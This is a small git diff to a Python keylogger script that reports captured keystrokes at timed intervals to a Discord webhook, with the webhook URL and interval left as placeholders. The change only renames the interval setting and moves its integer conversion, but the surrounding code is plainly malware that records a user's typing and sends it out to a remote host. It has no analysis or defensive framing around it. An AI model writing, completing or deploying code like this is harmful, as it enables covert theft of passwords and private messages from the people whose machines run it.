@@ -3,9 +3,9 @@ from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-
-SEND_REPORT_EVERY = int(TIME_IN_SECONDS_HERE)
+TIME = "INTERVALS_HERE"
 WEBHOOK = "WEBHOOK_URL_HERE"
+
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
@@ -65,5 +65,5 @@ class Keylogger:
         keyboard.wait()
     
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
+    keylogger = Keylogger(interval=int(TIME), report_method="webhook")    
     keylogger.start()
